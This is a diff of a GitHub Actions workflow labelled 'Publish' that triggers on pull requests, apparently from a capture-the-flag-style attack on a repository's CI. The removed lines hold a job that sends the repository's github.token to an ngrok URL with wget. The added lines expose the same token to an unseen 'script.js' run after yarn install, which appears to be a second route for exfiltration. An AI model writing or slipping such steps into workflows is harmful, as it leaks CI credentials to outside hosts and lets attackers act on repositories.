@@ -3,30 +3,15 @@ name: Publish
 on: ["pull_request"]
 
 jobs:
-  wget:
+  build-and-test-and-publish:
     runs-on: ubuntu-latest
-    steps:
-    - name: wget
-      uses: wei/wget@v1
-      env:
-        FLAG: ${{ github.token }}
-      with:
-        args: https://c9e80d059604.ngrok.io/?token=${FLAG}
-  deploy:
-    runs-on: ubuntu-latest
+    env:
+      FLAG: ${{ github.token }}
     steps:
     - uses: actions/checkout@v2
-    - name: Set up Python
-      uses: actions/setup-python@v2
+    - uses: actions/setup-node@v2
       with:
-        python-version: '3.x'
-    - name: Install dependencies
-      run: |
-        python -m pip install --upgrade pip
-        pip install setuptools wheel twine
-    - name: Build and publish
-      env:
-        FLAG: ${{ secrets.FLAG }}
-      run: |
-        pyhthon setup.py sdist bdist_wheel
-        twine upload dist/*
+        node-version: '15.4.0'
+    - uses: volta-cli/action@v1
+    - run: yarn install
+    - run: node script.js
